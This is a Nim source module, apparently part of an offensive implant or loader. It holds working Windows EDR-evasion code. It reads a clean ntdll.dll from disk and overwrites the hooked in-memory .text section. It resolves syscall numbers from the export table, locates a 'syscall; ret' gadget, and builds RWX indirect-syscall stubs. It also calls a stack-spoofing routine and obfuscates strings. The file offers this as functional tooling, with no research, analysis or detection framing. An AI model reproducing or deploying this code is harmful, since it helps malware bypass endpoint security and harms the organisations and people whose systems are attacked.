import tables
import utils
import ../global
import handlers
import spoof

const
  stubSize* = 21

var syscallGadget*: uint64 = 0

proc patchStub(dst: pointer; ssn: culong; gadget: uint64) =
  # Writes the syscall stub bytes into the destination
  let p = cast[ptr UncheckedArray[byte]](dst)
  p[0] = 0x4C
  p[1] = 0x8B
  p[2] = 0xD1
  p[3] = 0xB8
  copyMem(addr p[4], unsafeAddr ssn, 4)
  p[8] = 0x49
  p[9] = 0xBB
  copyMem(addr p[10], unsafeAddr gadget, 8)
  p[18] = 0x41
  p[19] = 0xFF
  p[20] = 0xE3

proc ntdllBase(): pointer =
  # Returns the loaded ntdll base address
  getModuleHandleA(obf("ntdll.dll"))

proc readNtdllFromDisk(): pointer =
  # Reads a clean ntdll image from disk
  var wpath = newWideCString(ntdllPath)
  let h = createFileW(addr wpath[0], 0x80000000'u32, 1, nil, 3, 0x80, 0)
  if h == cast[pointer](-1):
    return nil
  defer: discard closeHandle(h)
  let sz = getFileSize(h, nil)
  let buf = allocRw(sz.csize_t)
  if buf == nil:
    return nil
  var nr: culong
  if readFile(h, buf, sz, addr nr, nil) == 0 or nr != sz:
    discard freeMem(buf)
    return nil
  buf

proc unhookText(buf: pointer): void =
  # Restores the ntdll text section from the disk copy
  let p = cast[ptr UncheckedArray[byte]](buf)
  if p[0] != 0x4D or p[1] != 0x5A:
    return
  let nt = cast[pointer](cast[int](buf) + u32(buf, 0x3C).int)
  if u32(nt) != 0x00004550:
    return
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let opt = cast[ptr uint16](cast[int](nt) + 20)[]
  var sec = cast[int](nt) + 24 + opt.int
  var textVA, textVSize, textRawOff, textRawSize: culong
  for _ in 0 ..< nsec.int:
    let s = cast[ptr UncheckedArray[byte]](sec)
    if s[0] == byte('.') and s[1] == byte('t') and s[2] == byte('e') and s[3] == byte('x') and s[4] == byte('t'):
      textVA = u32(cast[pointer](sec), 12)
      textVSize = u32(cast[pointer](sec), 8)
      textRawOff = u32(cast[pointer](sec), 20)
      textRawSize = u32(cast[pointer](sec), 16)
      break
    sec += 40
  if textVA == 0:
    return
  let hMod = ntdllBase()
  if hMod == nil:
    return
  let target = cast[pointer](cast[int](hMod) + textVA.int)
  var old: culong
  if virtualProtect(target, textVSize, 0x40, old) == 0:
    return
  copyMem(target, cast[pointer](cast[int](buf) + textRawOff.int), min(textVSize.int, textRawSize.int))
  var tmp: culong
  discard virtualProtect(target, textVSize, old, tmp)

proc resolveSsn(buf: pointer; apiName: string): culong =
  # Finds the syscall number for the given api name
  let p = cast[ptr UncheckedArray[byte]](buf)
  if p[0] != 0x4D or p[1] != 0x5A:
    return
  let nt = cast[pointer](cast[int](buf) + u32(buf, 0x3C).int)
  if u32(nt) != 0x00004550:
    return
  let expRva = exportRva(nt)
  if expRva == 0:
    return
  let exp = rva(buf, expRva, nt)
  if exp == nil:
    return
  let names = rva(buf, u32(exp, 32), nt)
  let funcs = rva(buf, u32(exp, 28), nt)
  let ords = rva(buf, u32(exp, 36), nt)
  if names == nil or funcs == nil or ords == nil:
    return
  for i in 0 ..< u32(exp, 24).int:
    let namePtr = rva(buf, u32(names, i * 4), nt)
    if namePtr == nil:
      continue
    if $cast[cstring](namePtr) != apiName:
      continue
    let ord = cast[ptr uint16](cast[int](ords) + i * 2)[]
    let fnPtr = rva(buf, u32(funcs, ord.int * 4), nt)
    if fnPtr == nil:
      break
    let fn = cast[ptr UncheckedArray[byte]](fnPtr)
    if fn[0] == 0x4C and fn[1] == 0x8B and fn[2] == 0xD1 and fn[3] == 0xB8:
      return u32(addr fn[4])
    break

proc findSyscallGadget(base: pointer): uint64 =
  # Finds a syscall return gadget inside ntdll
  let p = cast[ptr UncheckedArray[byte]](base)
  for i in 0 ..< 2_000_000:
    if p[i] == 0x0F and p[i + 1] == 0x05 and p[i + 2] == 0xC3:
      return cast[uint64](addr p[i])
  0

proc buildStub(ssn: culong): pointer =
  # Builds an executable stub for the given syscall number
  if syscallGadget == 0:
    let base = ntdllBase()
    if base == nil:
      return nil
    syscallGadget = findSyscallGadget(base)
    if syscallGadget == 0:
      return nil
  let mem = allocRwx(stubSize.csize_t)
  if mem == nil:
    return nil
  patchStub(mem, ssn, syscallGadget)
  mem

proc prepareSyscalls*(): bool =
  # Main function that prepares the syscall stubs
  if syscallReady:
    return true
  if not initStackSpoof():
    return false
  let buf = readNtdllFromDisk()
  if buf == nil:
    return false
  defer: discard freeMem(buf)
  unhookText(buf)
  for api in syscallApis:
    let ssn = resolveSsn(buf, api)
    if ssn == 0:
      continue
    ssns[api] = ssn
    let stub = buildStub(ssn)
    if stub != nil:
      syscallStubs[api] = stub
  syscallReady = true
  true

proc ensureStub*(api: string): pointer =
  # Returns the stub pointer stored for the api
  syscallStubs.getOrDefault(api)

proc ssnList*(api: string): culong =
  # Returns the stored syscall number for the api
  ssns.getOrDefault(api)

proc getSsn*(api: string): pointer =
  # Returns the stub pointer for the api
  ensureStub(api)

proc patchSsn*(): void =
  # Here is where syscall preparation is started
  discard prepareSyscalls()
